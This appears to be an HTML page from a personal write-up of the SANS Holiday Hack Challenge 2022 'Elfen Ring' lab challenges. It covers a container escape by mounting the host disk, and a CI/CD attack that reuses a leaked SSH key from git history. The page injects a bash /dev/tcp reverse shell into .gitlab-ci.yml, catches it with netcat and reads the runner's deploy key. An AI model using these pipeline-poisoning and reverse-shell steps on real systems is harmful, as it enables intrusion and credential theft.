@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>HHC 2022 Write-Up | Elfen Ring</title>
+		<link rel="icon" type="image/png" sizes="32x32" href="./assets/img/favicon.png">
+		<link rel="stylesheet" type="text/css" href="./assets/style/main.css">
+		<script src="./assets/js/main.js"></script>
+		<meta charset="UTF-8">
+	</head>
+	<body>
+		<div class="navigation">
+			<h1 class="title">HHC 2022 Write-Up</h1>
+			<a href="./index.html">Home</a>
+			<a href="./orientation.html">Orientation</a>
+			<a href="./tolkien_ring.html">Tolkien Ring</a>
+			<a href="./elfen_ring.html">Elfen Ring</a>
+			<a href="./web_ring.html">Web Ring</a>
+			<a href="./cloud_ring.html">Cloud Ring</a>
+			<a href="./brof.html">Burning Ring of Fire</a>
+		</div>
+		<div class="page">
+			<h1>Recover the Elfen Ring</h1>
+			<p>Once you find the Elfen Ring door in the tunnels, you can help the elfs with their git issues.</p>
+			<div class="table_of_contents">
+				<h2 class="title">Contents</h2>
+				<a href="#objective1">Clone with a Difference</a>
+				<a href="#objective2">Prison Escape</a>
+				<a href="#objective3">Jolly CI/CD</a>
+			</div>
+			<div class="section" id="obective1">
+				<h1>1. Clone with a Difference <span style="color: #ee0e0e;">★</span><span style="color: #ffffff">★★★★</span></h1>
+				<div class="contents">
+					Open the terminal next to Bow Ninecandle and clone the repository to answer the question.<br><br>
+					<div class="quote">
+						<div class="speaker">Bow Ninecandle</div>
+						<div>"Well hello! I'm Bow Ninecandle!"</div>
+						<div>"Have you ever used Git before? It's so neat!"</div>
+						<div>"It adds so much convenience to DevOps, like those times when a new person joins the team."</div>
+						<div>"They can just clone the project, and start helping out right away!"</div>
+						<div>"Speaking of, maybe you could help me out with cloning this repo?"</div>
+						<div>"I've heard there's multiple methods, but I only know how to do one."</div>
+						<div>"If you need more help, check out the <a href="https://youtu.be/vIQY_FH1SVk" target="_blank">panel of very senior DevOps experts.</a>"</div>
+						<div>"..."</div>
+					</div><br>
+					<img src="./assets/img/clone-with-a-difference.png"><br>
+					Reformat the git url to http then use the new url to clone the repo.<br>
+					Read <code class="code_inline">README.md</code> to find the last word.<br><br>
+					<code class="code_large">bow@6dd67e5cd33a:~$ git clone http://haugfactory.com/asnowball/aws_scripts.git
+bow@6dd67e5cd33a:~$ cat aws_scripts/README.md
+...
+## Project status
+If you have run out of energy or time for your project, put a note at the top of the README saying that development has slowed down or stopped completely. Someone may choose to fork your project or volunteer to step in as a maintainer or owner, allowing your project to keep going. You can also make an explicit request for maintainers.
+bow@6dd67e5cd33a:~$ runtoanswer 
+                                        <u>Read that repo!</u>
+What's the last word in the README.md file for the aws_scripts repo?
+
+> maintainers
+Your answer: maintainers
+
+Checking......
+Your answer is <span style="color: chartreuse;">correct</span>!</code>
+				</div>
+			</div>
+			<div class="section" id="objective2">
+				<h1>2. Prison Escape <span style="color: #ee0e0e;">★★★</span><span style="color: #ffffff">★★</span></h1>
+				<div class="contents">
+					Escape the container and answer the question on the Objectives page of your badge.<br><br>
+					<div class="quote">
+						<div class="speaker">Tinsel Upatree</div>
+						<div>"Hiya hiya, I'm Tinsel Upatree!"</div>
+						<div>"Check me out, I'm working side-by-side with a real-life Flobbit. Epic!"</div>
+						<div>"Anyway, would ya' mind looking at this terminal with me?"</div>
+						<div>"It takes a few seconds to start up, but then you're logged into a super secure container environment!"</div>
+						<div>"Or maybe it isn't so secure? I've heard about container escapes, and it has me a tad worried."</div>
+						<div>"Do you think you could test this one for me? I'd appreciate it!"</div>
+						<div>"..."</div>
+					</div><br>
+					First, find the disk.<br>
+					Then make a directory to mount the disk to.<br>
+					Then mount the disk.<br>
+					Finally, find the key on the disk.<br><br>
+					<code class="code_large">Greetings Noble Player, 
+
+You find yourself in a jail with a recently captured Dwarven Elf.
+
+He desperately asks your help in escaping for he is on a quest to aid a friend in a search for treasure inside a crypto-mine. 
+
+If you can help him break free of his containment, he claims you would receive "MUCH GLORY!"
+
+Please, do your best to un-contain yourself and find the keys to both of your freedom.
+grinchum-land:~$ sudo fdisk -l
+Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
+2048 cylinders, 64 heads, 32 sectors/track
+Units: sectors of 1 * 512 = 512 bytes
+
+Disk /dev/vda doesn't contain a valid partition table
+grinchum-land:~$ sudo mkdir /mnt/test
+grinchum-land:~$ sudo mount /dev/vda /mnt/test
+grinchum-land:~$ cat /mnt/test/home/jailer/.ssh/jail.key.priv
+
+                Congratulations! 
+
+          You've found the secret for the 
+          HHC22 container escape challenge!
+
+                     .--._..--.
+              ___   ( _'-_  -_.'
+          _.-'   `-._|  - :- |
+      _.-'           `--...__|
+   .-'                       '--..___
+  / `._                              \
+   `. `._               one           |
+     `. `._                           /
+       '. `._    :__________....-----'
+         `..`---'    |-_  _- |___...----..._
+                     |_....--'             `.`.
+               _...--'                       `.`.
+          _..-'                             _.'.'
+       .-'             step                _.'.'
+       |                               _.'.'
+       |                   __....------'-'
+       |     __...------''' _|
+       '--'''        |-  - _ |
+               _.-''''''''''''''''''-._
+            _.'                        |\
+          .'                         _.' |
+          `._          closer           |:.'
+            `._                     _.' |
+               `..__                 |  |
+                    `---.._.--.    _|  |
+                     | _   - | `-.._|_.'
+          .--...__   |   -  _|
+         .'_      `--.....__ |
+        .'_                 `--..__
+       .'_                         `.
+      .'_    082bb339ec19de4935867   `-.
+      `--..____                        _`.
+               ```--...____          _..--'
+                     | - _ ```---.._.'
+                     |   - _ |
+                     |_ -  - |
+                     |   - _ |
+                     | -_  -_|
+                     |   - _ |
+                     |   - _ |
+                     | -_  -_|</code>
+				</div>
+			</div>
+			<div class="section" id="objective3">
+				<h1>3. Jolly CI/CD <span style="color: #ee0e0e;">★★★★★</span></h1>
+				<div class="contents">
+					Talk to Tinsel Upatree and use the git repo to get access to the web server.<br><br>
+					<div class="quote">
+						<div class="speaker">Tinsel Upatree</div>
+						<div>"Great! Thanks so much for your help!"</div>
+						<div>"Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on!"</div>
+						<div>"Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly."</div>
+						<div>"With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production."</div>
+						<div>"WHOOPS! I didn’t mean to commit that to <code class="code_inline">http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</code>..."</div>
+						<div>"Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!"</div>
+						<div>"..."</div>
+					</div><br>
+					<img src="./assets/img/jolly-cicd-intro.png"><br>
+					First, clone the git repo.<br><br>
+					<code>grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+Cloning into 'wordpress.flag.net.internal'...
+remote: Enumerating objects: 10195, done.
+remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
+Receiving objects: 100% (10195/10195), 36.49 MiB | 23.27 MiB/s, done.
+Resolving deltas: 100% (1799/1799), done.
+Updating files: 100% (9320/9320), done.</code><br>
+					Next, look through the <code class="code_inline">git log</code> to find mistakes.<br><br>
+					<code>grinchum-land:~/wordpress.flag.net.internal$ git log
+...
+commit e2208e4bae4d41d939ef21885f13ea8286b24f05
+Author: knee-oh <span><</span>sporx@kringlecon.com>
+Date:   Tue Oct 25 13:43:53 2022 -0700
+
+    big update
+
+commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
+Author: knee-oh <span><</span>sporx@kringlecon.com>
+Date:   Tue Oct 25 13:42:54 2022 -0700
+
+    whoops
+
+commit abdea0ebb21b156c01f7533cea3b895c26198c98
+Author: knee-oh <span><</span>sporx@kringlecon.com>
+Date:   Tue Oct 25 13:42:13 2022 -0700
+
+    added assets
+
+commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
+Author: knee-oh <span><</span>sporx@kringlecon.com>
+Date:   Mon Oct 24 17:32:07 2022 -0700
+
+    init commit
+...</code><br>
+					Now check what was changed in the suspiciously named commit (whoops).<br><br>
+					<code>grinchum-land:~/wordpress.flag.net.internal$ git diff e19f653bde9ea3de6af21a587e41e7a909db1ca5 abdea0ebb21b156c01f7533cea3b895c26198c98
+diff --git a/.ssh/.deploy b/.ssh/.deploy
+new file mode 100644
+index 0000000..3f7a9e3
+--- /dev/null
++++ b/.ssh/.deploy
+@@ -0,0 +1,7 @@
++-----BEGIN OPENSSH PRIVATE KEY-----
++b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
++QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
++9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
++AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
++PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
++-----END OPENSSH PRIVATE KEY-----
+diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
+new file mode 100644
+index 0000000..8c0b43c
+--- /dev/null
++++ b/.ssh/.deploy.pub
+@@ -0,0 +1 @@
++ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com</code><br>
+					The commit gave us a ssh private key that we can use to re-clone the git repo with more privileges.<br>
+					Create a new ssh id and replace the private and public keys with the ones from the commit above.<br><br>
+					Remove the old repo and re-clone it with the new ssh id.<br><br>
+					<code>grinchum-land:~$ eval "$(ssh-agent -s)"
+Agent pid 214
+grinchum-land:~$ ssh-add .ssh/id_ed25519
+Identity added: .ssh/id_ed25519 (sporx@kringlecon.com)
+grinchum-land:~$ rm -f -r wordpress.flag.net.internal
+grinchum-land:~$ git clone ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+Cloning into 'wordpress.flag.net.internal'...
+The authenticity of host 'gitlab.flag.net.internal (172.18.0.150)' can't be established.
+ED25519 key fingerprint is SHA256:jW9axa8onAWH+31D5iHA2BYliy2AfsFNaqomfCzb2vg.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'gitlab.flag.net.internal' (ED25519) to the list of known hosts.
+remote: Enumerating objects: 10195, done.
+remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
+Receiving objects: 100% (10195/10195), 36.49 MiB | 21.66 MiB/s, done.
+Resolving deltas: 100% (1799/1799), done.
+Updating files: 100% (9320/9320), done.</code><br>
+					Now you can edit the files and push your changes to the git server.<br>
+					To get access to the web server you first need to know the ssh key, which can be found on the git server.<br>
+					Add the following to the script in the <code class="code_inline">.gitlab-ci.yml</code> file.<br><br>
+					<code>    - sleep 10
+    - bash -i >& /dev/tcp/grinchum-land.flag.net.internal/1337 0>&1</code><br>
+					Next, commit your changes and push. When you push, listen for a connection from the git server.<br><br>
+					<code>grinchum-land:~/wordpress.flag.net.internal$ git commit -a
+[main ea27660] commit message
+	1 file changed, 1 insertion(+), 1 deletion(-)
+grinchum-land:~/wordpress.flag.net.internal$ git push && nc -lp 1337
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 2 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 275 bytes | 275.00 KiB/s, done.
+Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
+To ssh://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+	13820f9..ea27660  main -> main
+bash: cannot set terminal process group (206): Not a tty
+bash: no job control in this shell
+<span><</span>ziL/0/rings-of-powder/wordpress.flag.net.internal# </code><br>
+					You are now on the git server.<br>
+					The ssh key can be found in <code class="code_inline">/etc/gitlab-runner/hhc22-wordpress-deploy</code>.<br><br>
+					<code><span><</span>ziL/0/rings-of-powder/wordpress.flag.net.internal# cat /etc/gitlab-runner/hhc22-wordpress-deploy
+<span><</span>rnal# cat /etc/gitlab-runner/hhc22-wordpress-deploy
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3wAAAJiMXr0BjF69
+AQAAAAtzc2gtZWQyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3w
+AAAEBtNE6sqOFoqkmOhcB/9DgzaQhQRC/bwkAbsBXwqrt/mPwRh1lM6l/lES5Zcxv0UoIV
+aiIhfYehTVof3RXQ+2rfAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
+<span><</span>ziL/0/rings-of-powder/wordpress.flag.net.internal# exit</code><br>
+					Now you can create a new ssh id to connect to the web server.<br>
+					Once you create a ssh id with the private key above and delete the public key, you can connect to the web server.<br><br>
+					<code>grinchum-land:~$ ssh -i ~/.ssh/id_server root@wordpress.flag.net.internal
+The authenticity of host 'wordpress.flag.net.internal (172.18.0.88)' can't be established.
+ED25519 key fingerprint is SHA256:ASkA3MNGpDOJfb+/SoerXa9KaWx8OKVGaKWexP8qrsQ.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'wordpress.flag.net.internal' (ED25519) to the list of known hosts.
+Linux wordpress.flag.net.internal 5.10.51 #1 SMP Mon Jul 19 19:08:01 UTC 2021 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@wordpress:~# </code><br>
+					Finally, the flag you are looking for can be found in <code class="code_inline">flag.txt</code> on the root of the server.<br><br>
+					<code class="code_large">root@wordpress:~# cat /flag.txt
+
+						Congratulations! You've found the HHC2022 Elfen Ring!
+
+
+									 ░░░░            ░░░░                                      
+							 ░░                              ░░░░                              
+						 ░░                                      ░░░░                          
+																	 ░░                        
+				   ░░                                                  ░░░░                    
+																		   ░░                  
+								   ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░                  ░░                
+							   ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░                ░░              
+						   ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                ░░            
+					   ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░              ▓▓▓▓▓▓▓▓▒▒░░░░            ░░░░          
+	   ░░            ░░▒▒▓▓▓▓▓▓▓▓                            ▓▓▓▓▓▓▒▒░░            ░░░░        
+				   ░░▒▒▓▓▓▓▓▓                                    ▓▓▒▒▒▒░░          ░░░░        
+				   ▒▒▓▓▓▓▓▓                                        ▓▓▓▓▒▒░░          ░░░░      
+   ░░            ▒▒▓▓▓▓▓▓                                            ▓▓▒▒░░░░        ░░░░▒▒    
+			   ░░▒▒▓▓▓▓░░                                            ░░▒▒▒▒░░░░      ░░░░▒▒    
+			   ░░▓▓▓▓▓▓                                                ▓▓▒▒░░░░      ░░░░▒▒    
+ ░░            ▒▒▓▓▓▓                                                    ▒▒░░░░        ░░▒▒▒▒  
+ ░░          ░░▓▓▓▓▓▓                                                    ▒▒▒▒░░░░      ░░▒▒▒▒  
+ ░░          ▒▒▓▓▓▓                                                        ▒▒░░░░      ░░▒▒▒▒  
+			 ▒▒▓▓▓▓                                                        ▒▒░░░░░░    ░░▒▒▒▒  
+░░          ░░▓▓▓▓▒▒                                                        ▒▒░░░░░░    ░░▒▒▒▒▓▓
+░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
+░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
+░░          ▒▒▓▓▓▓               oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT             ░░░░░░░░  ░░▒▒▒▒▓▓
+░░░░        ▒▒▓▓▓▓                                                            ░░░░  ░░░░░░▒▒▒▒▓▓
+░░░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
+▒▒░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
+▒▒░░░░      ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
+▓▓░░░░      ░░▓▓▓▓▒▒                                                        ░░      ░░░░▒▒▒▒▓▓▓▓
+ ▒▒░░        ▒▒▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▒▒▓▓  
+ ▒▒░░░░      ░░▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▓▓▓▓  
+ ▓▓▒▒░░      ░░▒▒▓▓▓▓                                                    ░░      ░░▒▒▒▒▒▒▓▓▓▓  
+ ▓▓▒▒░░░░      ▒▒▒▒▓▓                                                          ░░░░▒▒▒▒▒▒▓▓▓▓  
+   ▒▒▒▒░░░░    ▒▒▒▒▒▒▒▒                                                        ░░▒▒▒▒▒▒▒▒▓▓    
+   ▓▓▒▒░░░░    ░░░░▒▒▒▒▓▓                                            ░░      ░░░░▒▒▒▒▒▒▓▓▓▓    
+	 ▒▒▒▒░░░░    ░░▒▒▒▒▒▒▒▒                                        ░░      ░░░░▒▒▒▒▒▒▒▒▓▓      
+	   ▓▓▒▒░░░░  ░░░░░░░░▒▒▓▓                                    ░░      ░░░░▒▒▒▒▒▒▓▓▓▓        
+	   ▓▓▓▓▒▒░░░░░░░░░░░░░░▒▒▒▒▓▓                            ░░        ░░░░▒▒▒▒▒▒▓▓▓▓▓▓        
+		 ▓▓▓▓▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒                ░░░░          ░░░░▒▒▒▒▒▒▓▓▓▓▓▓          
+		   ▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                ░░░░▒▒▒▒▒▒▓▓▓▓▓▓            
+			 ▓▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░                        ░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓              
+			   ▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░              ░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓                
+				 ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓                  
+				   ██▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓██                    
+					   ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                        
+						 ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████                          
+							 ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████                              
+							 ░░░░░░░░▓▓██████████████████░░░░░░░░                              </code><br>
+				</div>
+			</div>
+			<div class="section">
+				<div class="contents">
+					<img src="./assets/img/elfen-ring.png">
+				</div>
+			</div>
+		</div>
+		<div class="next_prev">
+			<a class="next" href="./web_ring.html">Next</a>
+			<a class="prev" href="./tolkien_ring.html">Previous</a>
+		</div>
+		<footer>
+			<div class="float_left">Brian DeBaggis</div>
+			<div class="right">1/6/2023</div>
+		</footer>
+	</body>
+</html>
